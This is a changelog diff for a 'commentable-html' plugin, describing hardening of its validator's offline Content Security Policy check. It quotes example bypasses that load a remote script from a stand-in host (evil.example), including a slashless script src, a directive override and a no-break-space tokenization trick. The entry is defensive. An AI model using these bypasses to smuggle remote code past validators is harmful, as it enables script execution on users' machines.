@@ -4,6 +4,75 @@ All notable changes to the `commentable-html` plugin are documented here. The fo
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and versions follow
 [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.660.0] - 2026-08-04
+
+### Fixed
+
+- The strict validator's offline Content Security Policy check no longer lets a hand-authored file
+  WIDEN the four fetch directives. Exclusivity was enforced only for the directives whose required
+  token is `'none'`; for `script-src`, `style-src`, `img-src` and `font-src` the check asked only
+  whether the required token was PRESENT, so a policy reading
+  `script-src 'unsafe-inline' https://evil.example; img-src data: https://evil.example` passed.
+  Combined with the slashes-required shape of the attribute network-URL test, a document carrying
+  `<script src="https:evil.example/payload.js">` beside that policy passed `validate.py --strict`
+  as offline-clean while a real browser fetched and EXECUTED the remote script. Each `'none'`
+  directive must now be exactly `'none'`, and each of the four fetch directives must contain its
+  required token and carry nothing outside a per-directive allowlist of source expressions that
+  provably cannot fetch (`'unsafe-inline'`, `'unsafe-eval'`, `'wasm-unsafe-eval'`,
+  `'unsafe-hashes'`, `'report-sample'`, `data:`, `blob:`). It is an allowlist rather than an exact
+  match on the string the exporter emits, so a legitimate hand-authored policy is not rejected for
+  no reason - but four shapes that look inert stay out of it: `'self'` (a `file://` document has an
+  opaque origin, so what it matches is unspecified and has historically meant the containing
+  directory), a hash source (CSP3 matches a hash against an external script carrying `integrity`),
+  `'strict-dynamic'` and a nonce (both propagate trust to a network load). Directive names and
+  source expressions are folded ASCII-only, since both are ASCII case-insensitive and a Unicode
+  fold could map a look-alike onto a real token, and a repeated directive is now read the way a
+  browser reads it - the FIRST copy is the policy - where the dict this was built from kept the
+  last, letting a permissive first copy be masked by a strict repeat.
+- The same check now counts only a policy `<meta>` a browser really APPLIES. It read the shared tag
+  index, which records every start tag, so a policy parked in an inert `<template>` - or written
+  after the head is over, where the HTML pragma directives are not processed at all - satisfied the
+  requirement while enforcing nothing. It now reads a parser view that records a policy meta only
+  in the head and outside a template (a `<noscript>` body was already excluded). Because CSP
+  enforcement across several policies is conjunctive, any applied policy that meets the contract
+  clears the check, and a failure reports the first policy's shortfalls. The Offline export emits
+  exactly the required tokens and inserts the meta as the head's first child, so the file it
+  produces passes unchanged and the gate and the strip still agree.
+- Three more ways the offline policy could be read as enforcing something a browser does not, all
+  closed with it. (1) The required directives are no longer the whole audit: CSP's more specific
+  fetch directives OVERRIDE the ones the offline contract pins whenever they are present, so
+  `script-src-elem https://evil.example` beside a compliant `script-src` re-opened the same hole
+  verbatim, and `worker-src` opened it with no attribute spelling at all (`new Worker(...)` from
+  the inline script the policy deliberately allows). The directive NAME set is now CLOSED - a
+  directive outside the required set is an error unless its source list is exactly `'none'` or
+  empty, neither of which can widen anything - which also rejects `report-uri`/`report-to`: a
+  meta-delivered policy ignores them, so they enforce nothing and a document promising zero network
+  has no use for a reporting endpoint. The directives that carry no source list at all
+  (`upgrade-insecure-requests`, `block-all-mixed-content`, `require-trusted-types-for`,
+  `trusted-types`, `sandbox`) are named instead of run through a source-list test their grammar
+  does not have, and a required directive with an EMPTY source list is accepted for the same
+  "matches nothing" reason `'none'` is. (2) The policy is tokenized on ASCII
+  whitespace only, the way CSP tokenizes it. Python's `str.split()` is Unicode-aware, so a NBSP
+  between a directive name and its value read as a separator here while a browser read the whole
+  run as one unrecognized directive name and enforced nothing at all - one character per directive
+  neutralized the policy while the check reported it complete. (3) A policy `<meta>` that arrives
+  LATE is reported rather than read: a meta-delivered policy is not retroactive, so a `<script>`, a
+  `<style>` that can `@import`, a fetching `<link>` or a `<noscript>` fallback written above it
+  loads with no policy in force. Lateness is decided by capability, not by tag name: the six
+  predecessors that can do neither whatever their attributes are inert (`html`, `head`, `meta`,
+  `title`, `base`, `template`), a `<link>` is judged by whether its `rel` fetches, and a `<script>`
+  by whether it carries a load attribute or a type a browser runs - so a `rel=canonical` link or an
+  `application/json` block above the policy is not a false rejection.
+- The head boundary this check uses is now the one the HTML parser draws, in all three directions.
+  Non-whitespace character data in the head pops the head and opens the body, so a policy `<meta>`
+  written after it is a body child whose pragma never runs (and only ASCII whitespace counts, since
+  a browser ends the head on a NBSP); an end tag named `body`, `html` or `br` is "anything else" in
+  both the "in head" and "after head" modes and ends it the same way, while every other end tag in
+  those modes is ignored and must not; and `</head>` does not end it either, because the "after
+  head" mode re-pushes the head element for a `base`/`link`/`meta`/`script`/`style`/`title`/
+  `template` start tag, so a meta written there really is a head child and discarding it would
+  report a document that has a policy as having none.
+
 ## [1.651.0] - 2026-08-04
 
 ### Fixed
